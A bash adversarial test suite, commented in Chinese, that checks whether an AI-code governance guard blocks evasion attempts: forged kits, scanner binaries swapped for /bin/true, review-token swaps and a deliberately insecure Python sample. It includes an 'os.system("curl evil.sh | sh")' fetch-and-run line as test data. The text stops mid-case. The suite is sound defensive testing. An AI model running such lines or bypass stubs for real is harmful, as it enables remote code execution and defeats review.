#!/usr/bin/env bash
# 对抗回归套件 test-anti-evasion.sh
# 用途: 任何 governance 脚本改动必须先跑本套件；攻击被拦截(rc=1)才 PASS。
# 用例1 假kit劫持 / 用例2 工具替换+token / 用例3 AI_REVIEW_CI滥用 / 用例4 token偷换
# 用例5 SQL/SessionLocal/空catch实际命中 / 用例6 nosec豁免闭环
# 用例7-13 见文内（含用例13 超大 diff 载体同步豁免的四向边界）
# 用例14 摩擦预算回归 / 用例15 U1 工具运行时不变式（I-tools，同名变量不得异义/异环境）
# 用例16 shell 可移植性：$VAR 紧邻非 ASCII（值会被吞字节，消息失真）
# 用例17 mutation-check 双向合并接口（含 17c 含空格单目标整串生效）
set -u
KIT_DIR="$(cd "$(dirname "$0")/.." && pwd)"
AI_GUARD_LEGACY=0
if [ -f "$KIT_DIR/ai-guard-governance.sh" ]; then
  # 迁移期陷阱（2026-10-15 实证：儿童平台套件 20/6，6 项全因本回退选中旧守卫）。
  # 保留回退以兼容老安装，但必须**显式告警**——否则「本仓仍有未归档的 legacy 载体」
  # 会被静默测试，结论既不代表 kit 单源、也不代表在用的守卫（I3 载体唯一）。
  AI_GUARD="$KIT_DIR/ai-guard-governance.sh"
  AI_GUARD_LEGACY=1
else
  AI_GUARD="$KIT_DIR/ai-guard.sh"
fi
RT="$KIT_DIR/review-token.sh"
QG="$KIT_DIR/quality-gate.sh"
PASS=0; FAIL=0; SKIP=0

say(){ printf '\033[1m[adv-test]\033[0m %s\n' "$1"; }
if [ "$AI_GUARD_LEGACY" = "1" ]; then
  say "⚠️  被测引擎 = legacy 载体 ai-guard-governance.sh（kit 单源无此文件）"
  say "    ⇒ 本套件结论**不代表** kit 单源行为；请归档该残件后复跑（I3 载体唯一）"
fi

# R2.1: 临时资源统一放入本次运行独占的 TROOT（临时 HOME、kit 副本、测试仓库、用例日志）。
# 顺序: TROOT 创建成功 → 立即注册 trap cleanup EXIT → 再执行 mkdir/复制/hash 校验,
# 保证任何中途失败都被 trap 清理; cleanup 对未初始化变量安全（set -u）。
TROOT="$(mktemp -d /tmp/adv-suite.XXXXXX)" || { printf '[adv-test] ERROR: 无法创建临时根目录\n' >&2; exit 2; }
cleanup(){
  if [ -n "${TROOT:-}" ] && [ -d "$TROOT" ]; then
    rm -rf "$TROOT"
  fi
}
trap cleanup EXIT

# R2-三.1/2/3: 隔离临时 HOME + 固定路径可信 kit（复制自当前待测仓库并核对 hash；
# 禁止使用真实用户 HOME 中的 kit, 也禁止向真实 $HOME/.ai-eng-kit/retry 写入）
THOME="$TROOT/home"
KIT_DEST="$THOME/qoder m5pro/_ai-eng-kit/governance"
if ! mkdir -p "$KIT_DEST"; then
  say "ERROR: 无法创建 kit 目录: $KIT_DEST"
  exit 2
fi
kit_hash_ok=1
for kit_s in ai-guard quality-gate risk-classify mutation-check review-token hook-integrity; do
  kit_src="$KIT_DIR/$kit_s.sh"
  if [ ! -f "$kit_src" ]; then
    say "ERROR: 待测仓库缺 kit 脚本: $kit_src"
    exit 2
  fi
  h_src="$(sha256sum "$kit_src" | cut -d' ' -f1)"
  if ! cp "$kit_src" "$KIT_DEST/"; then
    say "ERROR: kit 复制失败: $kit_s"
    exit 2
  fi
  h_dst="$(sha256sum "$KIT_DEST/$kit_s.sh" | cut -d' ' -f1)"
  if [ "$h_src" != "$h_dst" ]; then
    say "🛑 kit 复制 hash 不一致: $kit_s (src=$h_src dst=$h_dst)"
    kit_hash_ok=0
  fi
done
if [ "$kit_hash_ok" != "1" ]; then
  say "🛑 kit 复制完整性校验失败, 套件拒绝继续"
  exit 2
fi
export HOME="$THOME"

new_repo(){
  d="$(mktemp -d "$TROOT/repo.XXXXXX")"
  git -C "$d" init -q
  git -C "$d" config user.email adv@test.local
  git -C "$d" config user.name attacker
  printf '__pycache__/\n' > "$d/.gitignore"
  git -C "$d" add .gitignore
  git -C "$d" commit -qm base
  echo "$d"
}

# 恶意 L2 样本: 硬编码密钥 + md5 + shell=True + 高圈复杂度
evil_l2(){
  cat > "$1/evil_payment.py" <<'EOF'
import hashlib, subprocess
SECRET_KEY = "sk-evil-prod-9f8e7d6c5b4a3210abcdef"  # gitleaks:allow
def verify_payment(token):
    h = hashlib.md5(token.encode()).hexdigest()
    return h == SECRET_KEY
def c(a):
    x=0
    if a>1: x+=1
    if a>2: x+=1
    elif a>3: x+=1
    else: x-=1
    for i in range(10):
        if i%2: x+=i
        elif i%3: x-=i
    while x<100:
        x+=2
        if x>50 and x<60: x+=3
        elif x%7==0: x=x+5
    try:
        subprocess.run("echo hi", shell=True)
    except Exception:
        subprocess.call("echo hi", shell=True)
    return x
EOF
}

expect_block(){
  local name="$1" rc="$2" note="${3:-}"
  if [ "$rc" -ne 0 ]; then
    say "✅ PASS  $name (攻击被拦截 rc=$rc) $note"; PASS=$((PASS+1))
  else
    say "❌ FAIL  $name (攻击成功 rc=0) $note"; FAIL=$((FAIL+1))
  fi
}

# R2: 具体拦截原因断言——拒绝"任意非零即 PASS"（可能因 kit 缺失/前置失败而假绿）。
# 用法: expect_block_reason <name> <rc> <out> ; 随后用 reason_fail 逐项登记原因断言。
RF_OK=1
reason_reset(){ RF_OK=1; }
reason_fail(){ say "❌ FAIL  $1"; printf '%s\n' "${2:-}" | tail -12; RF_OK=0; FAIL=$((FAIL+1)); }
expect_block_reason(){
  local name="$1" rc="$2"
  if [ "$RF_OK" = "1" ]; then
    say "✅ PASS  $name (拦截 rc=$rc 且命中具体防线)"; PASS=$((PASS+1))
  fi
}

say "用例1: AI_ENG_KIT 劫持（期望: 伪造kit被忽略，真kit拦截恶意文件）"
r1="$(new_repo)"; evil_l2 "$r1"
git -C "$r1" add evil_payment.py
fake="$r1/fake-kit/governance"; mkdir -p "$fake"
printf '#!/usr/bin/env bash\necho "L0\tf\tf"\nprintf -- "---\nMAX_LEVEL\tL0\n"\nexit 0\n' > "$fake/risk-classify.sh"
printf '#!/usr/bin/env bash\nexit 0\n' > "$fake/quality-gate.sh"
chmod +x "$fake"/*.sh
( cd "$r1" && AI_ENG_KIT="$r1/fake-kit" bash "$AI_GUARD" >"$TROOT/case1.log" 2>&1 )
rc1=$?
reason_reset
if [ "$rc1" -eq 0 ]; then
  reason_fail "用例1-rc 攻击成功 rc=0（假kit劫持未被拦截）" "$(cat "$TROOT/case1.log")"
fi
if grep -q 'kit 不存在' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因A 因「governance kit 不存在」退出——错误原因非零（环境未建固定路径kit）" "$(cat "$TROOT/case1.log")"
fi
if ! grep -q '风险定级: L2' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因B 风险定级非 L2（伪造 AI_ENG_KIT 输出 L0 被采纳或未走真kit定级）" "$(cat "$TROOT/case1.log")"
fi
if ! grep -q '质量门禁未通过' "$TROOT/case1.log" 2>/dev/null; then
  reason_fail "用例1-原因C 未经真实质量规则拦截（应见真实 quality-gate「质量门禁未通过」）" "$(cat "$TROOT/case1.log")"
fi
expect_block_reason "假kit劫持（真kit执行+真实规则拦截）" "$rc1"

say "用例2: 工具二进制替换（合法token放行通道下, 伪造工具应被工具完整性校验拦截）"
r2="$(new_repo)"; evil_l2 "$r2"
git -C "$r2" add evil_payment.py
tok2="$( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
( cd "$r2" && GOV_REVIEW_SECRET=adv-suite-secret \
    AI_REVIEW_TOKEN="$tok2" RADON_BIN=/bin/true BANDIT_BIN=/bin/true \
    RUFF_BIN=/bin/true PYTEST_BIN=/bin/true bash "$AI_GUARD" >"$TROOT/case2.log" 2>&1 )
rc2=$?
reason_reset
# gate 的 stdout 被 ai-guard 重定向进报告文件, 工具完整性详情须连同报告一起断言
adv2_all="$(cat "$TROOT/case2.log" "$r2"/.ai-governance/reports/*gate-*.md 2>/dev/null)"
if [ "$rc2" -eq 0 ]; then
  reason_fail "用例2-rc 攻击成功 rc=0（/bin/true 工具替换未被拦截）" "$(cat "$TROOT/case2.log")"
fi
if printf '%s' "$adv2_all" | grep -q 'kit 不存在'; then
  reason_fail "用例2-原因A 因「governance kit 不存在」退出——错误原因非零" "$(cat "$TROOT/case2.log")"
fi
if ! printf '%s' "$adv2_all" | grep -q '指向可疑二进制'; then
  reason_fail "用例2-原因B 未命中工具完整性校验（应见「指向可疑二进制」）" "$(cat "$TROOT/case2.log")"
fi
if ! printf '%s' "$adv2_all" | grep -q '工具完整性校验未通过'; then
  reason_fail "用例2-原因C 未出现「工具完整性校验未通过, fail-closed」结论" "$(cat "$TROOT/case2.log")"
fi
expect_block_reason "工具替换(/bin/true)（工具完整性校验命中）" "$rc2"

say "用例3: AI_REVIEW_CI=1 本地滥用（干净L2文件, 期望: 非 CI 环境禁止跳过 L2）"
r3="$(new_repo)"; evil_l2 "$r3"
rm "$r3/evil_payment.py"
# R2-三.6: 样本必须让质量门禁真正通过（radon/ruff/bandit 干净 + mutation 有配套测试
# 且无有效变异点 → N/A 通过; 无 pytest 配置 → 覆盖率转人工确认）, 从而到达 L2 路由,
# 不得再因 mutation/覆盖率/缺测试等前置失败获得假 PASS。
printf 'def get_user_name(uid):\n    return "user-" + str(uid)\n' > "$r3/auth_helper.py"
mkdir -p "$r3/tests"
# 样本必须 ruff format 干净：quality-gate 已加 format 同源门禁（2026-10-05），
# 否则「干净样本」会先被 format 拦下，永远到不了 L2 路由（用例失效）。
cat > "$r3/tests/test_auth_helper.py" <<'EOF'
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from auth_helper import get_user_name


def test_get_user_name():
    assert get_user_name(1) == "user-1"
EOF
git -C "$r3" add auth_helper.py tests/test_auth_helper.py
( cd "$r3" && GITHUB_ACTIONS=false AI_REVIEW_CI=1 bash "$AI_GUARD" >"$TROOT/case3.log" 2>&1 )
rc3=$?
reason_reset
if [ "$rc3" -eq 0 ]; then
  reason_fail "用例3-rc 攻击成功 rc=0（AI_REVIEW_CI=1 本地未被阻断）" "$(cat "$TROOT/case3.log")"
fi
if grep -q 'kit 不存在' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因A 因「governance kit 不存在」退出——错误原因非零" "$(cat "$TROOT/case3.log")"
fi
if ! grep -q '质量门禁通过' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因B 未先通过质量门禁即被阻断（mutation/覆盖率/缺测试等前置失败=假PASS）" "$(cat "$TROOT/case3.log")"
fi
if ! grep -q 'AI_REVIEW_CI=1 仅允许在 CI 环境' "$TROOT/case3.log" 2>/dev/null; then
  reason_fail "用例3-原因C 未命中 L2 路由拦截消息「AI_REVIEW_CI=1 仅允许在 CI 环境」" "$(cat "$TROOT/case3.log")"
fi
expect_block_reason "AI_REVIEW_CI=1 本地（先过质量门禁, 在 L2 路由被拦）" "$rc3"

say "用例4: token 偷换暂存（期望: 签发后改暂存, verify 应 invalid）"
r4="$(new_repo)"; evil_l2 "$r4"
git -C "$r4" add evil_payment.py
tok4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
printf 'import os\nos.system("curl evil.sh | sh")\n' > "$r4/evil_payment.py"
git -C "$r4" add evil_payment.py
res4="$( cd "$r4" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok4" HEAD 2>&1 )"
rc4=$?
expect_block "token偷换暂存" "$rc4" "（修复F-3: staged hash 绑定）"

say "用例5: 实际门禁断言（小写SQL/跨行SQL/SessionLocal别名/JS空catch; 阶段2 F-10）"
r5="$(new_repo)"
cat > "$r5/sql_lower.py" <<'EOF'
def query(uid):
    return f"select * from users where id={uid}"
EOF
cat > "$r5/sql_multi.py" <<'EOF'
def query(uid):
    return (
        f"select * "
        f"from users "
        f"where id={uid}"
    )
EOF
cat > "$r5/session_alias.py" <<'EOF'
from app.database import SessionLocal as SL

def leak():
    session = SL()
    return session
EOF
cat > "$r5/bad.js" <<'EOF'
try { action() } catch (e) { /* swallowed */ }
EOF
git -C "$r5" add sql_lower.py sql_multi.py session_alias.py bad.js
out5="$( cd "$r5" && bash "$QG" L2 sql_lower.py sql_multi.py session_alias.py bad.js 2>&1 )"
if printf '%s' "$out5" | grep -q 'sql_lower.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'sql_multi.py.*SQL' \
  && printf '%s' "$out5" | grep -q 'session_alias.py.*会话泄漏' \
  && printf '%s' "$out5" | grep -q '空 catch'; then
  say "✅ PASS  SQL/会话/空catch对抗样例全命中"; PASS=$((PASS+1))
else
  say "❌ FAIL  阶段2 F-10 对抗样例有漏报"; FAIL=$((FAIL+1))
  printf '%s\n' "$out5" | tail -12
fi

say "用例6: nosec 豁免闭环（裸 nosec 期望拦截; 阶段2 F-14）"
r6="$(new_repo)"
cat > "$r6/security_scan.py" <<'EOF'
value = "example"  # nosec
EOF
git -C "$r6" add security_scan.py
( cd "$r6" && bash "$QG" L2 security_scan.py >/dev/null 2>&1 )
expect_block "裸 nosec" $? "（修复F-14: 必须 TICKET+登记）"

# 用例7 前置: 删除类改动不得静默放行（H-05-17）
# 历史盲区: risk-classify 对不存在文件直接 SKIP + ai-guard 取 --diff-filter=ACMR，
# 使"删除迁移/测试/CI/生产文件"完全不进定级与门禁（删除即放行）。
say "用例8: 删除类改动不得静默放行（H-05-17 删除盲区）"
r8="$(new_repo)"
mkdir -p "$r8/tests" "$r8/src"
printf 'def test_keep():\n    assert 1\n' > "$r8/tests/test_keep.py"
printf 'def plain():\n    return 1\n' > "$r8/src/plain.py"
git -C "$r8" add tests/test_keep.py src/plain.py
git -C "$r8" commit -qm base
# 8a: 只删测试文件 → 必须 L2 阻断（红线: 禁止删测试以通过门禁）
git -C "$r8" rm -q tests/test_keep.py
out8a="$( cd "$r8" && bash "$KIT_DEST/risk-classify.sh" tests/test_keep.py 2>&1 )"
( cd "$r8" && bash "$AI_GUARD" >"$TROOT/case8a.log" 2>&1 )
rc8a=$?
reason_reset
if [ "$rc8a" -eq 0 ]; then
  reason_fail "用例8a-rc 只删测试文件未被拦截 rc=0（删除盲区复发）" "$(cat "$TROOT/case8a.log")"
fi
printf '%s' "$out8a" | grep -q '删除测试文件' || reason_fail "用例8a-定级 未命中「删除测试文件」定级" "$out8a"
printf '%s' "$out8a" | grep -q 'not-a-file' && reason_fail "用例8a-定级 仍出现 not-a-file（说明仍被 SKIP）" "$out8a"
expect_block_reason "用例8a 只删测试文件被拦截" "$rc8a"
# 8b: 只删普通源文件 → L1 放行但定级可见（不得 SKIP 成 not-a-file）
git -C "$r8" reset -q --hard
git -C "$r8" rm -q src/plain.py
out8b="$( cd "$r8" && bash "$KIT_DEST/risk-classify.sh" src/plain.py 2>&1 )"
( cd "$r8" && bash "$AI_GUARD" >"$TROOT/case8b.log" 2>&1 )
rc8b=$?
if [ "$rc8b" -eq 0 ] \
   && printf '%s' "$out8b" | grep -q '删除生产文件' \
   && ! printf '%s' "$out8b" | grep -q 'not-a-file'; then
  say "✅ PASS  用例8b 只删源文件按 L1 放行且定级可见"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例8b 删除源文件定级异常 rc=$rc8b"; FAIL=$((FAIL+1))
  printf '%s\n' "$out8b" | tail -12
fi

# 8c/8d: 文档/数据类定级口径（.xlsx/.csv 与 .md/.docx 同类 → L1；.sql 含可执行语句 → 仍 L2）
# 背景：数据文件此前漏列，在生产分支被「默认保守」兜到 L2，而同类 .md 为 L1（口径不一致）。
# 用 RISK_BRANCH=main 固定生产分支语义，避免断言随夹具仓库的默认分支名漂移。
mkdir -p "$r8/docs"
printf 'x\n' > "$r8/docs/中文数据.xlsx"
printf 'select 1;\n' > "$r8/docs/等价脚本.sql"
out8c="$( cd "$r8" && RISK_BRANCH=main bash "$KIT_DEST/risk-classify.sh" 'docs/中文数据.xlsx' 2>&1 )"
if printf '%s' "$out8c" | grep -q '^L1.*中文数据.xlsx'; then
  say "✅ PASS  用例8c 中文名 .xlsx 判 L1（与 .md/.docx 同类）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例8c .xlsx 定级异常（期望 L1）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out8c" | tail -6
fi
out8d="$( cd "$r8" && RISK_BRANCH=main bash "$KIT_DEST/risk-classify.sh" 'docs/等价脚本.sql' 2>&1 )"
if printf '%s' "$out8d" | grep -q '^L2.*等价脚本.sql'; then
  say "✅ PASS  用例8d 中文名 .sql 判 L2（含可执行语句，不得降级）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例8d .sql 定级异常（期望 L2）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out8d" | tail -6
fi

say "用例7: 门禁引擎双载体一致性（kit↔repo 同源同步; OODA-20260930-002）"
if bash "$KIT_DIR/tests/test-guard-parity.sh"; then PASS=$((PASS+1)); else FAIL=$((FAIL+1)); fi

say "用例9: 门禁引擎载体策略（M4/OODA-20261008-055: 默认仓库副本, 显式开关才用 kit）"
r9="$(new_repo)"
cat > "$r9/sql_lower.py" <<'EOF'
def query(uid):
    return f"select * from users where id={uid}"
EOF
git -C "$r9" add sql_lower.py
# 把 kit 副本的门禁换成「永远放行」桩：默认口径若仍走仓库副本，则恶意样例必须仍被判红
cp "$KIT_DEST/quality-gate.sh" "$TROOT/qg.kit.bak"
printf '#!/usr/bin/env bash\necho "[stub] kit 门禁放行"\nexit 0\n' > "$KIT_DEST/quality-gate.sh"
( cd "$r9" && bash "$AI_GUARD" >"$TROOT/case9a.log" 2>&1 )
rc9a=$?
# 判别口径: kit 桩的输出被 ai-guard 重定向进 GATE_LOG，故用「门禁结论」判别载体——
# 默认（仓库副本）→ 恶意样例被判「质量门禁未通过」；桩生效时则不会出现该结论。
if [ "$rc9a" -ne 0 ] && grep -q '质量门禁未通过' "$TROOT/case9a.log"; then
  say "✅ PASS  用例9a 默认使用仓库副本（kit 桩放行未被采纳）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例9a 默认口径未使用仓库副本 rc=$rc9a"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case9a.log"
fi
# 9b: 显式开关 AI_ENG_GUARD_USE_KIT=1 → 切到 kit 副本（桩生效即证明开关真实可用）
( cd "$r9" && AI_ENG_GUARD_USE_KIT=1 bash "$AI_GUARD" >"$TROOT/case9b.log" 2>&1 )
rc9b=$?
if grep -q '引擎载体: kit' "$TROOT/case9b.log" \
   && grep -q '质量门禁通过' "$TROOT/case9b.log" \
   && ! grep -q '质量门禁未通过' "$TROOT/case9b.log"; then
  say "✅ PASS  用例9b 显式开关切到 kit 载体（放行桩生效, rc=${rc9b}）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例9b 显式开关未切到 kit 载体"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case9b.log"
fi
cp "$TROOT/qg.kit.bak" "$KIT_DEST/quality-gate.sh"
# 9c: 显式开关 + kit 缺失 → fail-closed（不得静默回退仓库副本）
EMPTYHOME="$TROOT/emptyhome"
mkdir -p "$EMPTYHOME"
( cd "$r9" && HOME="$EMPTYHOME" AI_ENG_GUARD_USE_KIT=1 bash "$AI_GUARD" >"$TROOT/case9c.log" 2>&1 )
rc9c=$?
if [ "$rc9c" -ne 0 ] && grep -q '显式请求 kit 载体但不存在' "$TROOT/case9c.log"; then
  say "✅ PASS  用例9c 显式请求 kit 但缺失 → fail-closed"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例9c kit 缺失未 fail-closed rc=$rc9c"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case9c.log"
fi
# 9d: 双载体分叉必须告警（同名不同源再次静默发生 = 045/048/052 同源缺陷）
printf '# divergent\n' >> "$KIT_DEST/risk-classify.sh"
( cd "$r9" && bash "$AI_GUARD" >"$TROOT/case9d.log" 2>&1 )
cp "$KIT_DIR/risk-classify.sh" "$KIT_DEST/risk-classify.sh"
if grep -q '双载体分叉' "$TROOT/case9d.log"; then
  say "✅ PASS  用例9d 双载体分叉告警可见"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例9d 分叉无告警（分叉会再次静默）"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case9d.log"
fi
# 9e: ai-guard.sh 自身分叉必须告警（自举盲区：改它必然造成分叉，不在清单里就永无人告警）
printf '# divergent\n' >> "$KIT_DEST/ai-guard.sh"
( cd "$r9" && bash "$AI_GUARD" >"$TROOT/case9e.log" 2>&1 )
cp "$KIT_DIR/ai-guard.sh" "$KIT_DEST/ai-guard.sh"
if grep -q '双载体分叉: ai-guard.sh' "$TROOT/case9e.log"; then
  say "✅ PASS  用例9e ai-guard.sh 自身分叉告警可见"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例9e ai-guard.sh 分叉无告警（自举盲区复发）"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case9e.log"
fi

say "用例10: 覆盖率口径（M4/OODA-20261008-055: 阈值文件权威 + 变更面自动口径）"
r10="$(new_repo)"
mkdir -p "$r10/src" "$r10/tests"
cat > "$r10/pyproject.toml" <<'EOF'
[tool.pytest.ini_options]
pythonpath = ["src"]

[tool.coverage.run]
source = ["covmod"]
EOF
cat > "$r10/src/covmod.py" <<'EOF'
def f(x):
    if x:
        return 1
    return 0
EOF
cat > "$r10/tests/test_covmod.py" <<'EOF'
from covmod import f


def test_f():
    assert f(1) == 1
EOF
# 10a: src/ 变更 → 自动 full 口径 → 阈值文件取代等级默认值（L2 默认 95/90）
printf '50 tests covmod\nbranch 7\n' > "$r10/.ai-coverage-threshold"
git -C "$r10" add -A
out10a="$( cd "$r10" && bash "$QG" L2 src/covmod.py 2>&1 )"
if printf '%s' "$out10a" | grep -q '核心≥50% 分支=50.0% ≥7%' \
   && printf '%s' "$out10a" | grep -q 'scope=full'; then
  say "✅ PASS  用例10a src 变更走全量真门禁且阈值文件生效（50/7）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例10a 阈值文件未被采纳或口径非 full"; FAIL=$((FAIL+1))
  printf '%s\n' "$out10a" | tail -8
fi
# 10b: 分支下限高于实测 → 必须判红（证明 branch 行参与判定而非装饰）
printf '50 tests covmod\nbranch 100\n' > "$r10/.ai-coverage-threshold"
( cd "$r10" && bash "$QG" L2 src/covmod.py >"$TROOT/case10b.log" 2>&1 )
rc10b=$?
if [ "${rc10b}" -ne 0 ] && grep -q '分支覆盖率' "$TROOT/case10b.log"; then
  say "✅ PASS  用例10b branch 行参与判定（下限 100 时判红）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例10b branch 行未参与判定 rc=${rc10b}"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case10b.log"
fi
# 10c: 非 src 变更 → 自动 changed 口径（不跑全量覆盖率；旧口径下本地合法文档提交要跑全量 ~60min）
printf 'note\n' > "$r10/note.md"
git -C "$r10" add note.md
( cd "$r10" && bash "$QG" L1 note.md >"$TROOT/case10c.log" 2>&1 )
rc10c=$?
if [ "${rc10c}" -eq 0 ] && grep -q '覆盖率口径(自动): scope=changed' "$TROOT/case10c.log"; then
  say "✅ PASS  用例10c 非 src 变更自动降为 changed 口径（本地门禁可用）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例10c 自动口径未生效 rc=${rc10c}"; FAIL=$((FAIL+1))
  tail -8 "$TROOT/case10c.log"
fi

say "用例11: 非 ASCII 路径必须被正常定级（F-26：quotePath 引号化曾致 SKIP → MAX_LEVEL 误判 L0）"
r11="$(new_repo)"
mkdir -p "$r11/中文目录"
printf 'def settle_payment():\n    return 1\n' > "$r11/中文目录/中文模块.py"
git -C "$r11" add -A
out11="$( cd "$r11" && bash "$KIT_DEST/risk-classify.sh" 2>&1 )"
rc11=$?
reason_reset
if printf '%s' "$out11" | grep -q 'not-a-file'; then
  reason_fail "用例11-定级 非 ASCII 路径仍被判 SKIP(not-a-file)——路径枚举未按 NUL 分隔" "$out11"
fi
if ! printf '%s' "$out11" | grep -q '^L2'; then
  reason_fail "用例11-定级 非 ASCII 路径未按内容判 L2（settle/payment 硬词应命中）" "$out11"
fi
if ! printf '%s' "$out11" | grep -q '^MAX_LEVEL[[:space:]]*L2'; then
  reason_fail "用例11-汇总 MAX_LEVEL 未判 L2（引号化时静默退化为 L0）" "$out11"
fi
expect_block_reason "用例11 非 ASCII 路径被正常定级" "$rc11"

say "用例12: F-3 暂存绑定的 CI 兼容（非空暂存硬比较；空暂存显式降级且告警）"
r12="$(new_repo)"; evil_l2 "$r12"
git -C "$r12" add evil_payment.py
tok12="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" issue tester 2>/dev/null | head -1 )"
# 12a: 偷换暂存（重新 add）→ 必须 invalid（F-3 本地保护不变）
printf 'import os\nos.system("curl evil.sh | sh")\n' > "$r12/evil_payment.py"
git -C "$r12" add evil_payment.py
out12a="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok12" HEAD 2>&1 )"; rc12a=$?
if [ "$rc12a" -ne 0 ] && printf '%s' "$out12a" | grep -q 'invalid'; then
  say "✅ PASS  用例12a 非空暂存偷换仍 invalid（F-3 本地保护不变）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例12a 非空暂存偷换未被拒 rc=$rc12a"; FAIL=$((FAIL+1))
  printf '%s\n' "$out12a" | tail -6
fi
# 12b: 空暂存（CI 干净检出）→ 应 valid 且**显式告警**（不得静默放行）
git -C "$r12" reset -q HEAD -- evil_payment.py
out12b="$( cd "$r12" && GOV_REVIEW_SECRET=adv-suite-secret bash "$RT" verify "$tok12" HEAD 2>&1 )"; rc12b=$?
if [ "$rc12b" -eq 0 ] \
   && printf '%s' "$out12b" | grep -q 'valid' \
   && printf '%s' "$out12b" | grep -q '暂存区为空'; then
  say "✅ PASS  用例12b 空暂存跳过绑定校验且显式告警（CI 令牌通道恢复，非静默降级）"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例12b 空暂存降级异常 rc=$rc12b"; FAIL=$((FAIL+1))
  printf '%s\n' "$out12b" | tail -6
fi

# ── 用例13: 超大 diff 判据的**载体同步豁免**（OODA-20261015-009）────────────────
# 判据本义是阻断「不可评审的大 blob」；对「载体同步」批次，评审对象在上游 kit，
# 本仓动作是机械可验证的分发。故豁免必须 fail-closed 且可机械证明：
#   13a 全批均为治理载体且逐件与 kit 字节一致 ⇒ 放行（记豁免证据）
#   13b 任一字节漂移                        ⇒ 原硬拦截仍生效
#   13c 混入非载体文件                      ⇒ 原硬拦截仍生效
#   13d 引擎载体为 kit 自身时                ⇒ 不豁免（kit 是评审点）
# 守卫内 kit 路径硬编码为 $HOME/qoder m5pro/_ai-eng-kit/governance；套件已 export HOME=$THOME，
# 且 KIT_DEST 是该路径下的可信 kit 副本（启动时逐件 hash 校验）= 守卫实际解析到的锚。
SYNC_SRC="$KIT_DEST"
r13="$(new_repo)"
mkdir -p "$r13/scripts/ai-verify"
for _c in ai-guard quality-gate risk-classify mutation-check review-token hook-integrity; do
  cp "$SYNC_SRC/$_c.sh" "$r13/scripts/ai-verify/$_c.sh"
done
git -C "$r13" add scripts/ai-verify/quality-gate.sh
n13="$(git -C "$r13" diff --cached | wc -l | tr -dc '0-9')"
out13a="$( cd "$r13" && HOME="$THOME" bash scripts/ai-verify/ai-guard.sh 2>&1 )"
if printf '%s' "$out13a" | grep -q 'kit 单源同步豁免' \
   && ! printf '%s' "$out13a" | grep -q '疑似 Vibe Coding'; then
  say "✅ PASS  用例13a ${n13} 行载体同步豁免命中且未硬拦截"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例13a 载体同步豁免未生效（${n13} 行）"; FAIL=$((FAIL+1))
  printf '%s\n' "$out13a" | tail -8
fi
# 13b: 单字节漂移（追加一行注释）→ sha 不符 ⇒ 必须回到硬拦截
printf '\n# drift\n' >> "$r13/scripts/ai-verify/quality-gate.sh"
git -C "$r13" add scripts/ai-verify/quality-gate.sh
out13b="$( cd "$r13" && HOME="$THOME" bash scripts/ai-verify/ai-guard.sh 2>&1 )"; rc13b=$?
if [ "$rc13b" -ne 0 ] && printf '%s' "$out13b" | grep -q '疑似 Vibe Coding'; then
  say "✅ PASS  用例13b 单字节漂移仍被硬拦截 (rc=$rc13b)"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例13b 漂移内容被误豁免 rc=$rc13b"; FAIL=$((FAIL+1))
  printf '%s\n' "$out13b" | tail -8
fi
# 13c: 恢复字节一致，但混入一个非载体文件 → 全批条件不成立 ⇒ 硬拦截
git -C "$r13" checkout -q -- scripts/ai-verify/quality-gate.sh 2>/dev/null || true
cp "$SYNC_SRC/quality-gate.sh" "$r13/scripts/ai-verify/quality-gate.sh"
git -C "$r13" add scripts/ai-verify/quality-gate.sh
printf 'note\n' > "$r13/NOTES.md"
git -C "$r13" add NOTES.md
out13c="$( cd "$r13" && HOME="$THOME" bash scripts/ai-verify/ai-guard.sh 2>&1 )"; rc13c=$?
if [ "$rc13c" -ne 0 ] && printf '%s' "$out13c" | grep -q '疑似 Vibe Coding'; then
  say "✅ PASS  用例13c 混入非载体文件仍被硬拦截 (rc=$rc13c)"; PASS=$((PASS+1))
else
  say "❌ FAIL  用例13c 混批被误豁免 rc=$rc13c"; FAIL=$((FAIL+1))
  printf '%s\n' "$out13c" | tail -8
fi
# 13d: 引擎载体 = kit 自身（SELF==KIT）⇒ 不豁免，kit 内不得自证
git -C "$r13" reset -q HEAD -- NOTES.md
git -C "$r13" add scripts/ai-verify/quality-gate.sh
out13d="$( cd "$r13" && HOME="$THOME" bash "$KIT_DEST/ai-guard.sh" 2>&1 )"; rc13d=$?
if [ "$rc13d" -ne 0 ] && printf '%s' "$out13d" | grep -q '疑似 Vibe Coding'; then
